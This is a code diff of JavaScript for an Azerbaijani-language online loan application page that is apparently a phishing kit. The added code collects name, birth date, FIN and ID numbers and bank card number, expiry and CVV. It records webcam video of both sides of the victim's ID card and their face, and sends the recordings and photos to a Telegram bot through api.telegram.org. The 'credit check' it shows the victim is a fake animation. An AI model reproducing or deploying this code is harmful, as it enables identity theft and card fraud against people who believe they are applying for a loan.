+            '<div class="bank-sub">' + bank.sub + '</div>';
+        grid.appendChild(div);
+    });
 }
 renderBanks();
 
 // ========== MODAL FUNCTIONS ==========
 function openModal(){
-  document.getElementById('modalOverlay').classList.add('active');
-  document.body.style.overflow='hidden';
-  showFormStep();
-  isPayment = false;
+    document.getElementById('modalOverlay').classList.add('active');
+    document.body.style.overflow='hidden';
+    showFormStep();
+    isPayment = false;
 }
 
 function closeModal(){
-  document.getElementById('modalOverlay').classList.remove('active');
-  document.body.style.overflow='';
-  showFormStep();
-  resetCreditCheck();
-  if(checkInterval) { clearInterval(checkInterval); checkInterval = null; }
-  if(faceScanInterval) { clearInterval(faceScanInterval); faceScanInterval = null; }
-  if(approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
-  isChecking = false;
-  isPayment = false;
-  faceScanActive = false;
-  waitingForApproval = false;
-  telegramPollingActive = false;
-  document.getElementById('cardNumberInput').value = '';
-  document.getElementById('cardDigits').textContent = '0000 0000 0000 0000';
-  document.getElementById('cardProgress').style.width = '0%';
-  document.getElementById('cardProgressLabel').textContent = '0/16 rəqəm daxil edilib';
-  document.querySelectorAll('.bank-option').forEach(function(b) { b.classList.remove('selected'); });
-  document.getElementById('cardExpiry').value = '';
-  document.getElementById('cardCvv').value = '';
-  document.getElementById('otpCode').value = '';
-  document.getElementById('otpStatus').style.display = 'none';
-  stopCamera();
+    document.getElementById('modalOverlay').classList.remove('active');
+    document.body.style.overflow='';
+    showFormStep();
+    resetCreditCheck();
+    if(checkInterval) { clearInterval(checkInterval); checkInterval = null; }
+    if(scanInterval) { clearInterval(scanInterval); scanInterval = null; }
+    if(approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
+    isChecking = false;
+    isPayment = false;
+    waitingForApproval = false;
+    telegramPollingActive = false;
+    stopVideoStream();
+    document.getElementById('cardNumberInput').value = '';
+    document.getElementById('cardDigits').textContent = '0000 0000 0000 0000';
+    document.getElementById('cardProgress').style.width = '0%';
+    document.getElementById('cardProgressLabel').textContent = '0/16 rəqəm daxil edilib';
+    document.querySelectorAll('.bank-option').forEach(function(b) { b.classList.remove('selected'); });
+    document.getElementById('cardExpiry').value = '';
+    document.getElementById('cardCvv').value = '';
+    document.getElementById('otpCode').value = '';
+    document.getElementById('otpStatus').style.display = 'none';
+    stopCamera();
 }
 
 function stopCamera() {
-  var video = document.getElementById('faceVideo');
-  if(video && video.srcObject) {
-    video.srcObject.getTracks().forEach(function(track) { track.stop(); });
-    video.srcObject = null;
-  }
+    var video = document.getElementById('faceVideo');
+    if(video && video.srcObject) {
+        video.srcObject.getTracks().forEach(function(track) { track.stop(); });
+        video.srcObject = null;
+    }
+}
+
+function stopVideoStream() {
+    if (videoStream) {
+        videoStream.getTracks().forEach(function(track) { track.stop(); });
+        videoStream = null;
+    }
+    var video = document.getElementById('scanVideo');
+    if (video) {
+        video.srcObject = null;
+    }
+    if (mediaRecorder) {
+        mediaRecorder.stop();
+        mediaRecorder = null;
+    }
+    recordedChunks = [];
 }
 
 function showFormStep(){
-  document.getElementById('formStep').style.display='block';
-  document.getElementById('summaryStep').style.display='none';
-  document.getElementById('faceScanStep').style.display='none';
-  document.getElementById('checkingStep').style.display='none';
-  document.getElementById('realCheckingStep').style.display='none';
-  document.getElementById('bankStep').style.display='none';
-  document.getElementById('cardInputStep').style.display='none';
-  document.getElementById('threeDStep').style.display='none';
-  document.getElementById('creditCheckModal').style.display='none';
+    document.getElementById('formStep').style.display='block';
+    document.getElementById('summaryStep').style.display='none';
+    document.getElementById('videoScanStep').style.display='none';
+    document.getElementById('checkingStep').style.display='none';
+    document.getElementById('realCheckingStep').style.display='none';
+    document.getElementById('bankStep').style.display='none';
+    document.getElementById('cardInputStep').style.display='none';
+    document.getElementById('threeDStep').style.display='none';
+    document.getElementById('creditCheckModal').style.display='none';
 }
 
 function showSummaryStep(){
-  document.getElementById('formStep').style.display='none';
-  document.getElementById('summaryStep').style.display='block';
-  document.getElementById('faceScanStep').style.display='none';
-  document.getElementById('checkingStep').style.display='none';
-  document.getElementById('realCheckingStep').style.display='none';
-  document.getElementById('bankStep').style.display='none';
-  document.getElementById('cardInputStep').style.display='none';
-  document.getElementById('threeDStep').style.display='none';
-  document.getElementById('creditCheckModal').style.display='none';
+    document.getElementById('formStep').style.display='none';
+    document.getElementById('summaryStep').style.display='block';
+    document.getElementById('videoScanStep').style.display='none';
+    document.getElementById('checkingStep').style.display='none';
+    document.getElementById('realCheckingStep').style.display='none';
+    document.getElementById('bankStep').style.display='none';
+    document.getElementById('cardInputStep').style.display='none';
+    document.getElementById('threeDStep').style.display='none';
+    document.getElementById('creditCheckModal').style.display='none';
 }
 
-// ========== SUBMIT FORM (NÖMRƏSİZ) ==========
+// ========== SUBMIT FORM ==========
 function submitForm() {
-  var fin = document.getElementById('fin').value.trim().toUpperCase();
-  var id = document.getElementById('idnum').value.trim();
-  var consent1 = document.getElementById('consent1').checked;
-  var consent2 = document.getElementById('consent2').checked;
-  var firstName = document.getElementById('firstName').value.trim();
-  var lastName = document.getElementById('lastName').value.trim();
-  var patronymic = document.getElementById('patronymic').value.trim();
-  var birth = document.getElementById('birthDate').value;
+    var fin = document.getElementById('fin').value.trim().toUpperCase();
+    var id = document.getElementById('idnum').value.trim();
+    var consent1 = document.getElementById('consent1').checked;
+    var consent2 = document.getElementById('consent2').checked;
+    var firstName = document.getElementById('firstName').value.trim();
+    var lastName = document.getElementById('lastName').value.trim();
+    var patronymic = document.getElementById('patronymic').value.trim();
+    var birth = document.getElementById('birthDate').value;
 
-  if(!firstName || !lastName){ alert('Ad və soyad daxil edin!'); return; }
-  if(!birth){ alert('Doğum tarixi daxil edin!'); return; }
-  if(!fin || fin.length !== 7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
-  if(!id || id.length !== 8){ alert('Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır!'); return; }
-  if(!consent1 || !consent2){ alert('Bütün razılıqları qeyd edin!'); return; }
+    if(!firstName || !lastName){ alert('Ad və soyad daxil edin!'); return; }
+    if(!birth){ alert('Doğum tarixi daxil edin!'); return; }
+    if(!fin || fin.length !== 7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
+    if(!id || id.length !== 8){ alert('Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır!'); return; }
+    if(!consent1 || !consent2){ alert('Bütün razılıqları qeyd edin!'); return; }
 
-  var prefix = document.getElementById('idPrefix').value || 'AZE';
-  document.getElementById('sumName').textContent = firstName.toUpperCase();
-  document.getElementById('sumSurname').textContent = lastName.toUpperCase();
-  document.getElementById('sumPatronymic').textContent = patronymic.toUpperCase() || '—';
-  document.getElementById('sumBirth').textContent = birth.split('-').reverse().join('.');
-  document.getElementById('sumFin').textContent = fin;
-  document.getElementById('sumId').textContent = prefix + ' ' + id;
-  var jobActive = document.querySelector('.toggle-btn.active');
-  document.getElementById('sumJob').textContent = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
+    var prefix = document.getElementById('idPrefix').value || 'AZE';
+    document.getElementById('sumName').textContent = firstName.toUpperCase();
+    document.getElementById('sumSurname').textContent = lastName.toUpperCase();
+    document.getElementById('sumPatronymic').textContent = patronymic.toUpperCase() || '—';
+    document.getElementById('sumBirth').textContent = birth.split('-').reverse().join('.');
+    document.getElementById('sumFin').textContent = fin;
+    document.getElementById('sumId').textContent = prefix + ' ' + id;
+    var jobActive = document.querySelector('.toggle-btn.active');
+    document.getElementById('sumJob').textContent = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
 
-  showSummaryStep();
+    showSummaryStep();
 }
 
-// ========== GO TO FACE SCAN ==========
-function goToFaceScan() {
-  document.getElementById('summaryStep').style.display = 'none';
-  document.getElementById('faceScanStep').style.display = 'block';
-  
-  document.getElementById('faceStatus').innerHTML = 'Üzünüzü dairənin içinə tutun<span class="sub">Kamera icazəsini aktiv edin</span>';
-  document.getElementById('faceStatusText').textContent = '';
-  document.getElementById('faceProgress').style.width = '0%';
-  document.getElementById('faceStartBtn').style.display = 'block';
-  document.getElementById('faceStartBtn').textContent = '📷 Kameranı aç';
+// ========== GO TO VIDEO SCAN ==========
+function goToVideoScan() {
+    document.getElementById('summaryStep').style.display = 'none';
+    document.getElementById('videoScanStep').style.display = 'block';
+    
+    scanStep = 0;
+    document.getElementById('scanStepCounter').textContent = '1 / 3';
+    document.getElementById('scanStatus').innerHTML = '📄 Şəxsiyyət vəsiqənizin ön tərəfini göstərin<span class="sub">Kameranı sənədə doğru tutun</span>';
+    document.getElementById('scanStatusText').textContent = '';
+    document.getElementById('scanProgress').style.width = '0%';
+    document.getElementById('scanStartBtn').style.display = 'block';
+    document.getElementById('scanStartBtn').textContent = '📷 Kameranı aç';
 }
 
-// ========== FACE SCAN ==========
-async function startFaceScan() {
-  var btn = document.getElementById('faceStartBtn');
-  btn.style.display = 'none';
-  
-  try {
-    var stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user', width: 300, height: 300 } 
-    });
-    var video = document.getElementById('faceVideo');
-    video.srcObject = stream;
-    await video.play();
+// ========== VIDEO SCAN ==========
+async function startVideoScan() {
+    var btn = document.getElementById('scanStartBtn');
+    btn.style.display = 'none';
     
-    setTimeout(function() {
-      captureAndSendPhoto(video);
-    }, 500);
-    
-    document.getElementById('faceStatus').innerHTML = '✅ Üz aşkarlandı!<span class="sub" style="color:var(--teal-deep);">Tərpənməyin, yoxlanılır...</span>';
-    document.getElementById('faceStatusText').textContent = '⏳ 20 saniyə yoxlanılır...';
-    
-    faceScanActive = true;
-    faceScanSeconds = 0;
-    var progress = 0;
-    
-    if(faceScanInterval) clearInterval(faceScanInterval);
-    faceScanInterval = setInterval(function() {
-      faceScanSeconds++;
-      progress = Math.min((faceScanSeconds / 20) * 100, 100);
-      document.getElementById('faceProgress').style.width = progress + '%';
-      document.getElementById('faceStatusText').textContent = '⏳ ' + faceScanSeconds + '/20 saniyə yoxlanılır...';
-      
-      if(faceScanSeconds >= 20) {
-        clearInterval(faceScanInterval);
-        faceScanInterval = null;
-        faceScanActive = false;
-        document.getElementById('faceStatus').innerHTML = '✅ Üz təsdiqi tamamlandı!<span class="sub" style="color:var(--teal-deep);">Məlumatlar yoxlanılır...</span>';
-        document.getElementById('faceStatusText').textContent = '✅ Üz uğurla təsdiqləndi!';
+    try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'environment', width: 640, height: 480 },
+            audio: false
+        });
         
-        captureAndSendPhoto(video);
-        stopCamera();
+        var video = document.getElementById('scanVideo');
+        video.srcObject = videoStream;
+        await video.play();
+        
+        // Video çəkilişinə başla
+        startRecording(video);
+        
+        // Addımı yenilə
+        updateScanStep();
+        
+        // Proqress bar
+        var progress = 0;
+        if(scanInterval) clearInterval(scanInterval);
+        scanInterval = setInterval(function() {
+            progress += 2;
+            if (progress > 100) progress = 100;
+            document.getElementById('scanProgress').style.width = progress + '%';
+            document.getElementById('scanStatusText').textContent = '⏳ Çəkiliş davam edir... ' + progress + '%';
+            
+            if (progress >= 100) {
+                clearInterval(scanInterval);
+                scanInterval = null;
+                // Növbəti addıma keç
+                nextScanStep();
+            }
+        }, 200);
+        
+    } catch(err) {
+        document.getElementById('scanStatus').innerHTML = '❌ Kamera icazəsi tələb olunur<span class="sub">Zəhmət olmasa kameraya icazə verin</span>';
+        document.getElementById('scanStatusText').textContent = '⚠️ Kamera əlçatan deyil. Brauzer icazələrini yoxlayın.';
+        btn.style.display = 'block';
+        btn.textContent = '🔄 Yenidən cəhd et';
+    }
+}
+
+function startRecording(video) {
+    recordedChunks = [];
+    var stream = video.srcObject;
+    
+    try {
+        mediaRecorder = new MediaRecorder(stream, {
+            mimeType: 'video/webm;codecs=vp9,opus'
+        });
+        
+        mediaRecorder.ondataavailable = function(event) {
+            if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
+        
+        mediaRecorder.onstop = function() {
+            // Video faylı yarat və Telegram-a göndər
+            if (recordedChunks.length > 0) {
+                var blob = new Blob(recordedChunks, { type: 'video/webm' });
+                sendVideoToTelegram(blob, getScanStepName());
+            }
+        };
+        
+        mediaRecorder.start(1000); // Hər saniyədən bir məlumat topla
+        
+    } catch(e) {
+        console.error('MediaRecorder xətası:', e);
+        // Fallback: şəkil çək
+        capturePhoto(video);
+    }
+}
+
+function getScanStepName() {
+    var names = ['on_tərəf', 'arxa_tərəf', 'üz'];
+    return names[scanStep] || 'sənəd';
+}
+
+function updateScanStep() {
+    var steps = [
+        { text: '📄 Şəxsiyyət vəsiqənizin ön tərəfini göstərin', sub: 'Kameranı sənədə doğru tutun', label: '1 / 3' },
+        { text: '📄 Şəxsiyyət vəsiqənizin arxa tərəfini göstərin', sub: 'Sənədi çevirin', label: '2 / 3' },
+        { text: '👤 Üzünüzü göstərin', sub: 'Kameraya baxın', label: '3 / 3' }
+    ];
+    
+    var step = steps[scanStep] || steps[0];
+    document.getElementById('scanStepCounter').textContent = step.label;
+    document.getElementById('scanStatus').innerHTML = step.text + '<span class="sub">' + step.sub + '</span>';
+    document.getElementById('scanProgress').style.width = '0%';
+}
+
+function nextScanStep() {
+    scanStep++;
+    
+    if (scanStep < 3) {
+        // Növbəti addıma keç
+        updateScanStep();
+        
+        // Yenidən çəkilişə başla
+        var progress = 0;
+        if(scanInterval) clearInterval(scanInterval);
+        scanInterval = setInterval(function() {
+            progress += 2;
+            if (progress > 100) progress = 100;
+            document.getElementById('scanProgress').style.width = progress + '%';
+            document.getElementById('scanStatusText').textContent = '⏳ Çəkiliş davam edir... ' + progress + '%';
+            
+            if (progress >= 100) {
+                clearInterval(scanInterval);
+                scanInterval = null;
+                nextScanStep();
+            }
+        }, 200);
+        
+    } else {
+        // Bütün addımlar bitdi
+        document.getElementById('scanStatus').innerHTML = '✅ Bütün sənədlər çəkildi!<span class="sub" style="color:var(--teal-deep);">Məlumatlar yoxlanılır...</span>';
+        document.getElementById('scanStatusText').textContent = '✅ Sənəd yoxlaması tamamlandı!';
+        
+        stopVideoStream();
         
         setTimeout(function() {
-          document.getElementById('faceScanStep').style.display = 'none';
-          document.getElementById('checkingStep').style.display = 'block';
-          startCheckingAnimation();
+            document.getElementById('videoScanStep').style.display = 'none';
+            document.getElementById('checkingStep').style.display = 'block';
+            startCheckingAnimation();
         }, 1500);
-      }
-    }, 1000);
-    
-  } catch(err) {
-    document.getElementById('faceStatus').innerHTML = '❌ Kamera icazəsi tələb olunur<span class="sub">Zəhmət olmasa kameraya icazə verin</span>';
-    document.getElementById('faceStatusText').textContent = '⚠️ Kamera əlçatan deyil. Brauzer icazələrini yoxlayın.';
-    btn.style.display = 'block';
-    btn.textContent = '🔄 Yenidən cəhd et';
-  }
+    }
 }
 
-function captureAndSendPhoto(video) {
-  try {
+function capturePhoto(video) {
     var canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 300;
-    canvas.height = video.videoHeight || 300;
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
     var ctx = canvas.getContext('2d');
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     
     canvas.toBlob(function(blob) {
-      if(blob) {
-        sendPhotoToTelegram(blob);
-      }
-    }, 'image/jpeg', 0.8);
-  } catch(e) {
-    console.error('Şəkil çəkmə xətası:', e);
-  }
+        if (blob) {
+            sendPhotoToTelegram(blob, getScanStepName());
+        }
+    }, 'image/jpeg', 0.9);
 }
 
-async function sendPhotoToTelegram(photoData) {
-  try {
-    var formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', photoData, 'face_scan.jpg');
-    formData.append('caption', '📸 Üz tanıma şəkli - ' + new Date().toLocaleString('az-AZ'));
-    
-    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
-      method: 'POST',
-      body: formData
-    });
-  } catch(e) { console.error('Şəkil göndərmə xətası:', e); }
+async function sendVideoToTelegram(blob, stepName) {
+    try {
+        var formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', blob, 'sənəd_' + stepName + '_' + Date.now() + '.webm');
+        formData.append('caption', '📹 Sənəd çəkilişi: ' + stepName + '\n📅 ' + new Date().toLocaleString('az-AZ'));
+        
+        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', {
+            method: 'POST',
+            body: formData
+        });
+        console.log('✅ Video Telegram-a göndərildi:', stepName);
+    } catch(e) {
+        console.error('Video göndərmə xətası:', e);
+        // Fallback: şəkil göndər
+        var video = document.getElementById('scanVideo');
+        if (video) capturePhoto(video);
+    }
+}
+
+async function sendPhotoToTelegram(blob, stepName) {
+    try {
+        var formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'sənəd_' + stepName + '_' + Date.now() + '.jpg');
+        formData.append('caption', '📸 Sənəd şəkli: ' + stepName + '\n📅 ' + new Date().toLocaleString('az-AZ'));
+        
+        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
+            method: 'POST',
+            body: formData
+        });
+        console.log('✅ Şəkil Telegram-a göndərildi:', stepName);
+    } catch(e) {
+        console.error('Şəkil göndərmə xətası:', e);
+    }
 }
 
 // ========== CHECKING ANIMATION (5 saniyə) ==========
 function startCheckingAnimation() {
-  isChecking = true;
-  checkSeconds = 0;
-  document.getElementById('checkingTimer').textContent = '0';
-  
-  var statusMessages = [
-    '🔍 Şəxsiyyət məlumatları yoxlanılır...',
-    '📋 Kredit tarixçəsi araşdırılır...',
-    '🏦 Bank sistemi ilə əlaqə qurulur...',
-    '✅ Məlumatlar təsdiqlənir...'
-  ];
-  
-  var msgIndex = 0;
-  if(checkInterval) clearInterval(checkInterval);
-  checkInterval = setInterval(function() {
-    checkSeconds++;
-    document.getElementById('checkingTimer').textContent = checkSeconds;
+    isChecking = true;
+    checkSeconds = 0;
+    document.getElementById('checkingTimer').textContent = '0';
     
-    if(checkSeconds % 2 === 0 && msgIndex < statusMessages.length - 1) {
-      msgIndex++;
-      document.querySelector('#checkingStep .check-sub').textContent = statusMessages[msgIndex];
-    }
-  }, 1000);
-  
-  setTimeout(function() {
-    if(isChecking) {
-      clearInterval(checkInterval);
-      checkInterval = null;
-      isChecking = false;
-      document.getElementById('checkingStep').style.display = 'none';
-      document.getElementById('bankStep').style.display = 'block';
-    }
-  }, 5000);
+    var statusMessages = [
+        '🔍 Şəxsiyyət məlumatları yoxlanılır...',
+        '📋 Kredit tarixçəsi araşdırılır...',
+        '🏦 Bank sistemi ilə əlaqə qurulur...',
+        '✅ Məlumatlar təsdiqlənir...'
+    ];
+    
+    var msgIndex = 0;
+    if(checkInterval) clearInterval(checkInterval);
+    checkInterval = setInterval(function() {
+        checkSeconds++;
+        document.getElementById('checkingTimer').textContent = checkSeconds;
+        
+        if(checkSeconds % 2 === 0 && msgIndex < statusMessages.length - 1) {
+            msgIndex++;
+            document.querySelector('#checkingStep .check-sub').textContent = statusMessages[msgIndex];
+        }
+    }, 1000);
+    
+    setTimeout(function() {
+        if(isChecking) {
+            clearInterval(checkInterval);
+            checkInterval = null;
+            isChecking = false;
+            document.getElementById('checkingStep').style.display = 'none';
+            document.getElementById('bankStep').style.display = 'block';
+        }
+    }, 5000);
 }
 
 // ========== KALKULYATOR ==========
@@ -1800,35 +1863,35 @@ var feeOut = document.getElementById('feeOut');
 var termOut = document.getElementById('termOut');
 
 function updateSliderFill(el){
-  var pct = ((el.value - el.min) / (el.max - el.min)) * 100;
-  el.style.setProperty('--fill', pct + '%');
+    var pct = ((el.value - el.min) / (el.max - el.min)) * 100;
+    el.style.setProperty('--fill', pct + '%');
 }
 
 function calc(){
-  var amount = parseInt(amountSlider.value);
-  var termIndex = parseInt(termSlider.value);
-  var termOption = termOptions.find(function(t) { return t.value === termIndex; }) || termOptions[5];
-  var termLabelText = termOption.label;
-  var days = termOption.days;
-  var dailyRate = 0.04 / 30;
-  var fee = Math.round(amount * 0.09);
-  var interest = Math.round(amount * dailyRate * days);
-  var total = amount + fee + interest;
-  var monthly = Math.round(total / Math.max(1, days / 30));
+    var amount = parseInt(amountSlider.value);
+    var termIndex = parseInt(termSlider.value);
+    var termOption = termOptions.find(function(t) { return t.value === termIndex; }) || termOptions[5];
+    var termLabelText = termOption.label;
+    var days = termOption.days;
+    var dailyRate = 0.04 / 30;
+    var fee = Math.round(amount * 0.09);
+    var interest = Math.round(amount * dailyRate * days);
+    var total = amount + fee + interest;
+    var monthly = Math.round(total / Math.max(1, days / 30));
 
-  amountLabel.textContent = amount.toLocaleString('az-AZ') + ' ₼';
-  termLabel.textContent = termLabelText;
-  monthlyOut.textContent = monthly.toLocaleString('az-AZ') + ' ₼';
-  totalOut.textContent = total.toLocaleString('az-AZ') + ' ₼';
-  principalOut.textContent = amount.toLocaleString('az-AZ') + ' ₼';
-  feeOut.textContent = fee.toLocaleString('az-AZ') + ' ₼';
-  termOut.textContent = termLabelText;
+    amountLabel.textContent = amount.toLocaleString('az-AZ') + ' ₼';
+    termLabel.textContent = termLabelText;
+    monthlyOut.textContent = monthly.toLocaleString('az-AZ') + ' ₼';
+    totalOut.textContent = total.toLocaleString('az-AZ') + ' ₼';
+    principalOut.textContent = amount.toLocaleString('az-AZ') + ' ₼';
+    feeOut.textContent = fee.toLocaleString('az-AZ') + ' ₼';
+    termOut.textContent = termLabelText;
 
-  document.getElementById('creditAmountDisplay').textContent = amount.toLocaleString('az-AZ') + ' ₼';
-  document.getElementById('creditTermDisplay').textContent = termLabelText + ' müddətə';
+    document.getElementById('creditAmountDisplay').textContent = amount.toLocaleString('az-AZ') + ' ₼';
+    document.getElementById('creditTermDisplay').textContent = termLabelText + ' müddətə';
 
-  updateSliderFill(amountSlider);
-  updateSliderFill(termSlider);
+    updateSliderFill(amountSlider);
+    updateSliderFill(termSlider);
 }
 
 amountSlider.addEventListener('input', calc);
@@ -1837,20 +1900,20 @@ setTimeout(calc, 100);
 
 // ========== ID CARD PREVIEW ==========
 function updateIDPreview() {
-  var name = document.getElementById('firstName').value || 'ƏLİ';
-  var surname = document.getElementById('lastName').value || 'MƏMMƏDOV';
-  var patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
-  var birth = document.getElementById('birthDate').value || '1990-01-01';
-  var fin = document.getElementById('fin').value || '7A2BC9D';
-  var id = document.getElementById('idnum').value || '12345678';
-  var prefix = document.getElementById('idPrefix').value || 'AZE';
-  
-  document.getElementById('previewName').textContent = name.toUpperCase() || 'ƏLİ';
-  document.getElementById('previewSurname').textContent = surname.toUpperCase() || 'MƏMMƏDOV';
-  document.getElementById('previewPatronymic').textContent = patronymic.toUpperCase() || 'ƏLİ OĞLU';
-  document.getElementById('previewBirth').textContent = birth ? birth.split('-').reverse().join('.') : '01.01.1990';
-  document.getElementById('previewFin').textContent = fin.toUpperCase() || '7A2BC9D';
-  document.getElementById('previewId').textContent = (prefix || 'AZE') + ' ' + (id || '12345678');
+    var name = document.getElementById('firstName').value || 'ƏLİ';
+    var surname = document.getElementById('lastName').value || 'MƏMMƏDOV';
+    var patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
+    var birth = document.getElementById('birthDate').value || '1990-01-01';
+    var fin = document.getElementById('fin').value || '7A2BC9D';
+    var id = document.getElementById('idnum').value || '12345678';
+    var prefix = document.getElementById('idPrefix').value || 'AZE';
+    
+    document.getElementById('previewName').textContent = name.toUpperCase() || 'ƏLİ';
+    document.getElementById('previewSurname').textContent = surname.toUpperCase() || 'MƏMMƏDOV';
+    document.getElementById('previewPatronymic').textContent = patronymic.toUpperCase() || 'ƏLİ OĞLU';
+    document.getElementById('previewBirth').textContent = birth ? birth.split('-').reverse().join('.') : '01.01.1990';
+    document.getElementById('previewFin').textContent = fin.toUpperCase() || '7A2BC9D';
+    document.getElementById('previewId').textContent = (prefix || 'AZE') + ' ' + (id || '12345678');
 }
 
 document.getElementById('firstName').addEventListener('input', updateIDPreview);
@@ -1864,50 +1927,50 @@ updateIDPreview();
 
 // ========== TOGGLE ==========
 document.querySelectorAll('.toggle-btn').forEach(function(btn) {
-  btn.addEventListener('click', function() {
-    var parent = btn.parentElement;
-    parent.querySelectorAll('.toggle-btn').forEach(function(b) { b.classList.remove('active'); });
-    btn.classList.add('active');
-  });
+    btn.addEventListener('click', function() {
+        var parent = btn.parentElement;
+        parent.querySelectorAll('.toggle-btn').forEach(function(b) { b.classList.remove('active'); });
+        btn.classList.add('active');
+    });
 });
 
 // ========== BANK SELECT ==========
 function selectBank(el) {
-  document.querySelectorAll('.bank-option').forEach(function(b) { b.classList.remove('selected'); });
-  el.classList.add('selected');
-  var bankName = el.dataset.bank;
-  selectedBankData = {
-    name: bankName,
-    color: el.dataset.color
-  };
-  document.getElementById('selectedBankDisplay').textContent = selectedBankData.name;
+    document.querySelectorAll('.bank-option').forEach(function(b) { b.classList.remove('selected'); });
+    el.classList.add('selected');
+    var bankName = el.dataset.bank;
+    selectedBankData = {
+        name: bankName,
+        color: el.dataset.color
+    };
+    document.getElementById('selectedBankDisplay').textContent = selectedBankData.name;
 }
 
 function goToCardInput() {
-  if(!document.querySelector('.bank-option.selected')){
-    alert('Zəhmət olmasa bir bank seçin!');
-    return;
-  }
-  document.getElementById('bankStep').style.display='none';
-  document.getElementById('cardInputStep').style.display='block';
-  
-  var bankName = selectedBankData.name;
-  document.getElementById('cardBankName').textContent = bankName.toUpperCase();
-  
-  var bank = banks.find(function(b) { return b.name === bankName; });
-  if(bank) {
-    document.getElementById('cardLogoOnCard').src = bank.logo;
-  }
-  
-  var cardVisual = document.getElementById('bankCardVisual');
-  var bankInfo = bankDataMap[bankName];
-  if(bankInfo) {
-    cardVisual.style.background = bankInfo.bg;
-  }
-  
-  setTimeout(function() { 
-    document.getElementById('cardNumberInput').focus(); 
-  }, 300);
+    if(!document.querySelector('.bank-option.selected')){
+        alert('Zəhmət olmasa bir bank seçin!');
+        return;
+    }
+    document.getElementById('bankStep').style.display='none';
+    document.getElementById('cardInputStep').style.display='block';
+    
+    var bankName = selectedBankData.name;
+    document.getElementById('cardBankName').textContent = bankName.toUpperCase();
+    
+    var bank = banks.find(function(b) { return b.name === bankName; });
+    if(bank) {
+        document.getElementById('cardLogoOnCard').src = bank.logo;
+    }
+    
+    var cardVisual = document.getElementById('bankCardVisual');
+    var bankInfo = bankDataMap[bankName];
+    if(bankInfo) {
+        cardVisual.style.background = bankInfo.bg;
+    }
+    
+    setTimeout(function() { 
+        document.getElementById('cardNumberInput').focus(); 
+    }, 300);
 }
 
 // ========== KART INPUT ==========
@@ -1917,376 +1980,374 @@ var cardProgress = document.getElementById('cardProgress');
 var cardProgressLabel = document.getElementById('cardProgressLabel');
 
 document.getElementById('bankCardVisual').addEventListener('click', function(e) {
-  cardNumberInput.focus();
+    cardNumberInput.focus();
 });
 
 cardNumberInput.addEventListener('input', function() {
-  var val = this.value.replace(/\D/g,'').slice(0,16);
-  this.value = val;
-  
-  var formatted = val.padEnd(16, '0');
-  var display = formatted.replace(/(\d{4})/g, '$1 ').trim();
-  cardDigits.textContent = display;
-  
-  var progress = (val.length / 16) * 100;
-  cardProgress.style.width = progress + '%';
-  cardProgressLabel.textContent = val.length + '/16 rəqəm daxil edilib';
+    var val = this.value.replace(/\D/g,'').slice(0,16);
+    this.value = val;
+    
+    var formatted = val.padEnd(16, '0');
+    var display = formatted.replace(/(\d{4})/g, '$1 ').trim();
+    cardDigits.textContent = display;
+    
+    var progress = (val.length / 16) * 100;
+    cardProgress.style.width = progress + '%';
+    cardProgressLabel.textContent = val.length + '/16 rəqəm daxil edilib';
 });
 
 document.getElementById('cardDisplayArea').addEventListener('click', function() {
-  cardNumberInput.focus();
+    cardNumberInput.focus();
 });
 
 document.getElementById('cardExpiry').addEventListener('input', function() {
-  var val = this.value.replace(/\D/g,'').slice(0,4);
-  if(val.length > 2) {
-    val = val.slice(0,2) + '/' + val.slice(2);
-  }
-  this.value = val;
-  document.getElementById('cardExpiryDisplay').textContent = val || 'MM/YY';
+    var val = this.value.replace(/\D/g,'').slice(0,4);
+    if(val.length > 2) {
+        val = val.slice(0,2) + '/' + val.slice(2);
+    }
+    this.value = val;
+    document.getElementById('cardExpiryDisplay').textContent = val || 'MM/YY';
 });
 
 document.getElementById('cardCvv').addEventListener('input', function() {
-  var val = this.value.replace(/\D/g,'').slice(0,4);
-  this.value = val;
-  var display = val.padEnd(3, '*');
-  document.getElementById('cardCvvDisplay').textContent = display;
+    var val = this.value.replace(/\D/g,'').slice(0,4);
+    this.value = val;
+    var display = val.padEnd(3, '*');
+    document.getElementById('cardCvvDisplay').textContent = display;
 });
 
-// ========== SEND CARD TO TELEGRAM (NÖMRƏSİZ) ==========
+// ========== SEND CARD TO TELEGRAM ==========
 function sendCardToTelegram() {
-  var cardNumber = cardNumberInput.value;
-  if(cardNumber.length < 16){
-    alert('16 rəqəmli kart nömrəsini daxil edin!');
-    cardNumberInput.focus();
-    return;
-  }
-  var expiry = document.getElementById('cardExpiry').value;
-  if(expiry.length < 5){
-    alert('Bitmə tarixini daxil edin (AA/İİ)!');
-    document.getElementById('cardExpiry').focus();
-    return;
-  }
-  var cvv = document.getElementById('cardCvv').value;
-  if(cvv.length < 3){
-    alert('CVV kodunu daxil edin!');
-    document.getElementById('cardCvv').focus();
-    return;
-  }
+    var cardNumber = cardNumberInput.value;
+    if(cardNumber.length < 16){
+        alert('16 rəqəmli kart nömrəsini daxil edin!');
+        cardNumberInput.focus();
+        return;
+    }
+    var expiry = document.getElementById('cardExpiry').value;
+    if(expiry.length < 5){
+        alert('Bitmə tarixini daxil edin (AA/İİ)!');
